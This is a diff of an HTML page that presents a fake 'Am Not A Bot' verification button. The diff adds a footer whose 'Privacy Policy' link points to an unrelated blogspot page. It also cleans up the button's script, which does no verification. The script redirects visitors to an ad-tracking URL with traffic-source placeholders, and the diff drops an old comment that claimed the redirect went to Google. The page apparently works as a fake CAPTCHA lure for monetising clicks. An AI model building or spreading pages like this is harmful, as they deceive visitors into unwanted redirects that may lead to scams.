@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -22,6 +21,8 @@
             min-height: 100vh;
             color: white;
             overflow: hidden;
+            position: relative;
+            padding-bottom: 80px; /* Make space for footer */
         }
 
         .container {
@@ -74,6 +75,25 @@
             transform: translateY(0);
         }
 
+        /* Privacy Policy Footer */
+        .footer {
+            position: absolute;
+            bottom: 20px;
+            width: 100%;
+            text-align: center;
+            font-size: 0.85rem;
+            opacity: 0.8;
+        }
+
+        .footer a {
+            color: #ffcc00;
+            text-decoration: underline;
+        }
+
+        .footer a:hover {
+            color: #ffeb3b;
+        }
+
         @media (max-width: 768px) {
             .container {
                 padding: 40px 30px;
@@ -86,6 +106,11 @@
             p {
                 font-size: 1rem;
             }
+
+            .footer {
+                font-size: 0.8rem;
+                bottom: 15px;
+            }
         }
     </style>
 </head>
@@ -96,10 +121,16 @@
         <button class="verify-btn" onclick="verifyUser()">Am Not A Bot</button>
     </div>
 
+    <!-- Privacy Policy Footer -->
+    <div class="footer">
+        <a href="https://malawiansadsversion3.blogspot.com/" target="_blank" rel="noopener noreferrer">
+            Privacy Policy
+        </a>
+    </div>
+
     <script>
         function verifyUser() {
-            // Redirect to Google
-            window.location.href = '  https://www.posicaodominate.wiki/?sl=6011197-9f369&pub_click_id={External_ID_from_traffic_source}&site={subID}&pub_sub_id={sub_subID}  ';
+            window.location.href = 'https://www.posicaodominate.wiki/?sl=6011197-9f369&pub_click_id={External_ID_from_traffic_source}&site={subID}&pub_sub_id={sub_subID}';
         }
     </script>
 </body>
